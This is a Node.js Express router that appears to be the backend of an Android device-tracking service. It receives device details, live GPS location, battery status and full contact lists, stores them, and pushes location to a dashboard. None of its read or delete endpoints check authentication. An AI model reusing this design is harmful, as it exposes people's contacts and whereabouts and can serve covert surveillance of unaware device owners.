const express = require('express');
const router = express.Router();
const Device = require('../models/Device');

// 📱 Register/Update Device Information
router.post('/device', async (req, res) => {
  try {
    const { deviceId, model, manufacturer, androidVersion } = req.body;

    if (!deviceId) {
      return res.status(400).json({ 
        success: false, 
        message: 'Device ID is required' 
      });
    }

    let device = await Device.findOne({ deviceId });

    if (device) {
      device.model = model || device.model;
      device.manufacturer = manufacturer || device.manufacturer;
      device.androidVersion = androidVersion || device.androidVersion;
      device.lastSeen = new Date();
      await device.save();
    } else {
      device = new Device({
        deviceId,
        model: model || 'Unknown',
        manufacturer: manufacturer || 'Unknown',
        androidVersion: androidVersion || 'Unknown',
      });
      await device.save();
    }

    res.json({ 
      success: true, 
      message: 'Device registered successfully',
      device 
    });
  } catch (error) {
    console.error('Error registering device:', error);
    res.status(500).json({ 
      success: false, 
      message: 'Server error' 
    });
  }
});



// 📍 Receive Location Updates
router.post('/location', async (req, res) => {
  try {
    const { deviceId, latitude, longitude, timestamp } = req.body;

    if (!deviceId || latitude === undefined || longitude === undefined) {
      return res.status(400).json({
        success: false,
        message: 'Device ID, latitude, and longitude are required'
      });
    }

    // Update device location in DB
    await Device.findOneAndUpdate(
      { deviceId },
      { 
        lastSeen: new Date(),
        location: { latitude, longitude, updatedAt: new Date() }
      },
      { upsert: true }
    );

    // Broadcast to dashboard via WebSocket
    if (req.io) {
      req.io.emit('locationUpdate', {
        deviceId,
        latitude,
        longitude,
        timestamp: timestamp || new Date()
      });
    }

    console.log(`📍 Location updated: ${deviceId} -> ${latitude}, ${longitude}`);

    res.json({ success: true, message: 'Location updated' });
  } catch (error) {
    console.error('Error updating location:', error);
    res.status(500).json({ success: false, message: 'Server error' });
  }
});

// 📞 Receive and Store Contacts
router.post('/contacts', async (req, res) => {
  try {
    const { deviceId, contacts } = req.body;

    if (!deviceId || !contacts) {
      return res.status(400).json({ 
        success: false, 
        message: 'Device ID and contacts are required' 
      });
    }

    let device = await Device.findOne({ deviceId });

    if (!device) {
      device = new Device({
        deviceId,
        model: 'Unknown',
        manufacturer: 'Unknown',
      });
    }

    device.contacts = contacts;
    device.lastSeen = new Date();
    await device.save();

    res.json({ 
      success: true, 
      message: `${contacts.length} contacts saved successfully` 
    });
  } catch (error) {
    console.error('Error saving contacts:', error);
    res.status(500).json({ 
      success: false, 
      message: 'Server error' 
    });
  }
});

// 🔋 Receive Battery Updates (WebSocket - No DB storage)
router.post('/battery', async (req, res) => {
  try {
    const { deviceId, batteryLevel, isCharging } = req.body;

    if (!deviceId || batteryLevel === undefined) {
      return res.status(400).json({ 
        success: false, 
        message: 'Device ID and battery level are required' 
      });
    }

    // Check if WebSocket is available
    if (!req.io) {
      console.error('❌ Socket.IO not available');
      return res.status(500).json({ 
        success: false, 
        message: 'WebSocket not configured' 
      });
    }

    // Update lastSeen only (no battery storage in DB)
    await Device.findOneAndUpdate(
      { deviceId },
      { lastSeen: new Date() },
      { upsert: true }
    );

    // Broadcast battery update via WebSocket
    req.io.emit('batteryUpdate', {
      deviceId,
      batteryLevel,
      isCharging,
      timestamp: new Date()
    });

    console.log(`✓ Battery broadcasted: ${deviceId} - ${batteryLevel}% ${isCharging ? '⚡' : ''}`);

    res.json({ 
      success: true, 
      message: 'Battery status broadcasted via WebSocket' 
    });
  } catch (error) {
    console.error('Error broadcasting battery:', error);
    res.status(500).json({ 
      success: false, 
      message: 'Server error',
      error: error.message 
    });
  }
});

// 📊 Get All Devices (For Dashboard)
router.get('/devices', async (req, res) => {
  try {
    const devices = await Device.find().sort({ lastSeen: -1 });

    const devicesData = devices.map(device => ({
      deviceId: device.deviceId,
      model: device.model,
      manufacturer: device.manufacturer,
      androidVersion: device.androidVersion,
      contacts: device.contacts || [],
      contactCount: device.contacts ? device.contacts.length : 0,
      lastSeen: device.lastSeen,
    }));

    res.json(devicesData);
  } catch (error) {
    console.error('Error fetching devices:', error);
    res.status(500).json({ 
      success: false, 
      message: 'Server error' 
    });
  }
});

// 📱 Get Single Device Data
router.get('/device/:deviceId', async (req, res) => {
  try {
    const device = await Device.findOne({ deviceId: req.params.deviceId });

    if (!device) {
      return res.status(404).json({ 
        success: false, 
        message: 'Device not found' 
      });
    }

    res.json({
      deviceId: device.deviceId,
      model: device.model,
      manufacturer: device.manufacturer,
      androidVersion: device.androidVersion,
      contacts: device.contacts || [],
      lastSeen: device.lastSeen,
    });
  } catch (error) {
    console.error('Error fetching device:', error);
    res.status(500).json({ 
      success: false, 
      message: 'Server error' 
    });
  }
});

// 🗑️ Delete Device
router.delete('/device/:deviceId', async (req, res) => {
  try {
    const device = await Device.findOneAndDelete({ deviceId: req.params.deviceId });

    if (!device) {
      return res.status(404).json({ 
        success: false, 
        message: 'Device not found' 
      });
    }

    res.json({  
      success: true, 
      message: 'Device deleted successfully' 
    });
  } catch (error) {
    console.error('Error deleting device:', error);
    res.status(500).json({ 
      success: false, 
      message: 'Server error' 
    });
  }
});

module.exports = router;